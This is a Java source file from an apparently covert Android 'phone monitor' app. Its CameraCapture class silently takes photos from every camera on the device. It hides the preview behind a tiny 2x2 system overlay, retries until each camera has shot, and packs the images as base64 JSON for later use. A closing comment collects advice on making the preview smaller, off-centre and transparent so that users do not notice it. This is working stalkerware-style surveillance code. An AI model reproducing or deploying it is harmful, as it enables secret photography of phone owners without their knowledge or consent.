package com.monitor.phone.s0ft.phonemonitor;

import android.content.Context;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;

class CameraCapture {
    enum PictureCaptureMethod {
        PCM_SURFACE_TEXTURE,//newer method but supposedly less reliable
        PCM_SURFACE_VIEW//supposed to be more reliable and supported on all android devices
    }

    private final Context context;
    private boolean cameraBusy = false;
    private JSONArray photosBase64Arr = new JSONArray();

    CameraCapture(Context context) {
        this.context = context;
    }

    String TakePicture(PictureCaptureMethod pictureCaptureMethodEnum) {
        String retval = "";
        int maxNumberOfReTrials = 10;
        int numberOfCameras = Camera.getNumberOfCameras();

        if (numberOfCameras >= 1) {

            /*Populate into a list which camera(s) need to be captured*/
            List<Integer> uncapturedCameraNumbers = new ArrayList<>();
            for (int i = 0; i < numberOfCameras; i++) uncapturedCameraNumbers.add(i);

            /*Perform camera capture trials until there's no uncaptured camera left or the max number of trials has been reached*/
            int trialNumber = 0;
            while (uncapturedCameraNumbers.size() > 0 && trialNumber++ < maxNumberOfReTrials) {
                Log.w(AppSettings.getTAG(), "Starting photo capture iteration number " + trialNumber);
                for (Integer camNumber : uncapturedCameraNumbers) {
                    switch (pictureCaptureMethodEnum) {
                        case PCM_SURFACE_TEXTURE:
                            cameraBusy = true;
                            CaptureUsingSurfaceTexture(camNumber);
                            try {
                                HelperMethods.waitWithTimeout(new Callable() {//allow the capture to be completed
                                    @Override
                                    public Object call() throws Exception {
                                        return cameraBusy;
                                    }
                                }, false, 10000);//if photo isn't captured within 10s, it probably never will be
                            } catch (Exception ex) {
                                //some exception
                            }
                            break;
                        case PCM_SURFACE_VIEW:
                            cameraBusy = true;
                            CaptureUsingSurfaceView(camNumber);
                            try {
                                HelperMethods.waitWithTimeout(new Callable() {//allow the capture to be completed
                                    @Override
                                    public Object call() throws Exception {
                                        return cameraBusy;
                                    }
                                }, false, 10000);//if photo isn't captured within 10s, it probably never will be
                            } catch (Exception ex) {
                                //some exception
                            }
                            break;
                    }
                }
                /*Determine which camera(s) haven't captured and modify the uncapturedCameraNumbers list*/
                uncapturedCameraNumbers = new ArrayList<>();
                for (int i = 0; i < numberOfCameras; i++) {
                    JSONObject photoJSONObj = null;
                    try {
                        photoJSONObj = photosBase64Arr.getJSONObject(i);
                    } catch (JSONException jsex) {
                    }
                    if (photoJSONObj == null) {
                        uncapturedCameraNumbers.add(i);
                        Log.w(AppSettings.getTAG(), "Camera number " + i + " failed to shoot in iteration " + trialNumber);
                    }
                }
            }


            Log.w(AppSettings.getTAG(), "Exit from photo capture iteration loop.\n" + (numberOfCameras - uncapturedCameraNumbers.size()) + "/" + numberOfCameras + " of cameras captured photos in " + trialNumber + " trials.");
            retval = photosBase64Arr.toString();
        }

        return retval;
    }

    private void CaptureUsingSurfaceView(final int CameraType) {
        //Note: According to the stackoverflow community, this method is the most reliable and works on all android devices.

        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {//this runnable will run in the main thread of the app. creating a surfaceview seems to be only possible in the main thread. lost 3 hours to this.
            @Override
            public void run() {
                SurfaceView dummySurfaceView = new SurfaceView(context);
                SurfaceHolder surfaceHolder = dummySurfaceView.getHolder();
                surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
                surfaceHolder.addCallback(new SurfaceHolder.Callback() {
                    @Override
                    public void surfaceCreated(SurfaceHolder surfaceHolder) {
                        Log.w(AppSettings.getTAG(), "Surface created. Next up, camera.TakePicture().");

                        try {
                            Camera camera = Camera.open(CameraType);
                            camera.setPreviewDisplay(surfaceHolder);
                            camera.startPreview();
                            try {
                                Thread.sleep(1000);
                                //sleeping after starting preview will allow camera to adjust exposure
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }

                            camera.takePicture(null, null, new Camera.PictureCallback() {
                                @Override
                                public void onPictureTaken(byte[] bytes, Camera camera) {
                                    Long currentTimestampSeconds = System.currentTimeMillis() / 1000;
                                    try {
                                        JSONObject thisPhoto = new JSONObject();
                                        thisPhoto.put("Timestamp", currentTimestampSeconds);
                                        thisPhoto.put("ImageBase64", Base64.encodeToString(bytes, Base64.DEFAULT));
                                        photosBase64Arr.put(CameraType, thisPhoto);//putting photo into the index of CameraType is very important for later checking which camera failed to take photo
                                        Log.w(AppSettings.getTAG(), "Picture taken using SurfaceView from camera " + CameraType);
                                    } catch (JSONException jsex) {
                                        //sth wrong with JSON. do nothing
                                        Log.w(AppSettings.getTAG(), "JSONException while populating pictures JSON array.\n" + jsex.getMessage());
                                    }
                                    camera.stopPreview();
                                    camera.release();
                                    cameraBusy = false;
                                }
                            });

                        } catch (Exception ex) {
                            Log.w(AppSettings.getTAG(), ex.getMessage());
                            cameraBusy = false;
                        }
                    }

                    @Override
                    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {

                    }

                    @Override
                    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {

                    }
                });

                WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                if (windowManager != null) {
                    try {
                        windowManager.removeView(dummySurfaceView);
                    } catch (Exception ex) {
                    }
                    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(2, 2, WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY, 0, PixelFormat.UNKNOWN);
                    windowManager.addView(dummySurfaceView, layoutParams);
                }


            }
        });
    }

    private void CaptureUsingSurfaceTexture(final int CameraType) {
        //Note : According to the stackoverflow community, this method MAY NOT work on all devices and it WILL NOT work on android OS version older than 3.0
        //But during the development of this program, my Samsung Galaxy Grand Prime SM-G530H running Android 5.0.2 API 21 seems to have no issue with it.

        Camera camera = null;
        final SurfaceTexture surfaceTexture = new SurfaceTexture(0);//I'm not sure about the texName parameter. Used what works.
        try {
            camera = Camera.open(CameraType);
            try {
                Thread.sleep(1000);
                //sleep seems to be necessary for the surfaceTexture to 'initialise' properly. without sleep, sometimes the picture gets taken, sometimes not.
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            camera.setPreviewTexture(surfaceTexture);//note this method was only added in API level 11 i.e. android 3.0
            camera.startPreview();
            try {
                Thread.sleep(1000);
                //sleeping after starting preview will allow camera to adjust exposure
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] bytes, Camera camera) {
                    Long currentTimestampSeconds = System.currentTimeMillis() / 1000;
                    try {
                        JSONObject thisPhoto = new JSONObject();
                        thisPhoto.put("Timestamp", currentTimestampSeconds);
                        thisPhoto.put("ImageBase64", Base64.encodeToString(bytes, Base64.DEFAULT));
                        photosBase64Arr.put(CameraType,thisPhoto);//putting photo into the index of CameraType is very important for later checking which camera failed to take photo
                        Log.w(AppSettings.getTAG(), "Picture taken using SurfaceTexture from camera " + CameraType);
                    } catch (JSONException jsex) {
                        //sth wrong with JSON. do nothing
                        Log.w(AppSettings.getTAG(), "JSONException while populating pictures JSON array.\n" + jsex.getMessage());
                    }
                    camera.stopPreview();
                    camera.release();
                    surfaceTexture.release();
                    cameraBusy = false;
                }
            });
        } catch (Exception ex) {
            Log.w(AppSettings.getTAG(), "Error opening camera at CameraCapture.CaptureUsingSurfaceTexture()\n" + ex.getMessage());
            if (camera != null)
                camera.release();
            surfaceTexture.release();
            cameraBusy = false;
        }


    }


}

    /*
    * References:
    * https://stackoverflow.com/questions/2386025/taking-picture-from-camera-without-preview
    * and other related stackoverflow threads.
    * From the thread listed above, one nice piece of answer from Sam:

    Taking the Photo
    Get this working first before trying to hide the preview.

    Correctly set up the preview:
    Use a SurfaceView (pre-Android-4.0 compatibility) or SurfaceTexture (Android 4+, can be made transparent)
    Set and initialise it before taking the photo
    Wait for the SurfaceView's SurfaceHolder (via getHolder()) to report surfaceCreated() or the TextureView to report onSurfaceTextureAvailable to its SurfaceTextureListener before setting and initialising the preview.

    Ensure the preview is visible:
    Add it to the WindowManager
    Ensure its layout size is at least 1x1 pixels (you might want to start by making it MATCH_PARENT x MATCH_PARENT for testing)
    Ensure its visibility is View.VISIBLE (which seems to be the default if you don't specify it)
    Ensure you use the FLAG_HARDWARE_ACCELERATED in the LayoutParams if it's a TextureView.
    Use takePicture's JPEG callback since the documentation says the other callbacks aren't supported on all devices

    Troubleshooting:
    If surfaceCreated/onSurfaceTextureAvailable doesn't get called, the SurfaceView/TextureView probably isn't being displayed.
    If takePicture fails, first ensure the preview is working correctly. You can remove your takePicture call and let the preview run to see if it displays on the screen.
    If the picture is darker than it should be, you might need to delay for about a second before calling takePicture so that the camera has time to adjust its exposure once the preview has started.

    Hiding the Preview:
    Make the preview View 1x1 size to minimise its visibility (or try 8x16 for possibly more reliability):
    new WindowManager.LayoutParams(1, 1, ...)
            Move the preview out of the centre to reduce its noticeability:

            new WindowManager.LayoutParams(width, height,
            Integer.MIN_VALUE, Integer.MIN_VALUE, ...)
            Make the preview transparent (only works for TextureView)

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            width, height, ...
            PixelFormat.TRANSPARENT);
            params.alpha = 0;
    */


